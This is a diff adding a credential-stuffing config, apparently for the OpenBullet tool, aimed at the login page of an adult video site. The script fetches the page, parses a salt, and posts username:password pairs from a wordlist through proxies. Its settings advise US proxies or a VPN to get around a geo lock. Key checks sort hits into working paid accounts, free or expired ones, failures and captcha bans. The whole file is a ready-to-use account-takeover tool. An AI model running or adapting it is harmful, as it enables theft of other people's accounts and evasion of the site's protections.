@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "JavHD",
+  "SuggestedBots": 30,
+  "LastModified": "2018-05-14T21:11:49.3287645+00:00",
+  "AdditionalInfo": "Geo IP lock! Only use US proxies and log in with US IP (VPN)",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://secure.javhd.com/login/?back=javhd.com&path=L2Vu&lang=en&nats=NzAzLjIuMi4yLjAuMC4wLjAuMA" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_SALT PARSE "<SOURCE>" LR "salt = '" "'" Recursive=FALSE -> VAR "SALT" "" "" 
+#LOGIN REQUEST POST "https://secure.javhd.com/login/?back=javhd.com&path=L2Vu&lang=en&nats=NzAzLjIuMi4yLjAuMC4wLjAuMA" AutoRedirect=TRUE 
+  CONTENT "path=L2Vu&v=join&login=<USER>&password=<PASS>&back=javhd.com&ch=<SALT>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://secure.javhd.com" 
+  HEADER "referer: https://secure.javhd.com/login/?back=javhd.com&path=L2Vu&lang=en&nats=NzAzLjIuMi4yLjAuMC4wLjAuMA" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Wrong username or password" 
+    KEY "number of unsuccessful login attempts left" 
+    KEY "Sorry, but your account has been blocked." 
+  KEYCHAIN Success AND 
+    KEY ">Profile<" 
+    KEY "<SOURCE>" DoesNotContain "/upgrade" 
+  KEYCHAIN CUSTOM "FREE" AND 
+    KEY "/upgrade" 
+    KEY ">Profile<" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY ">Expired Access<" 
+  KEYCHAIN Ban OR 
+    KEY "Please help us validate that you are indeed human by solving the provided captcha" 
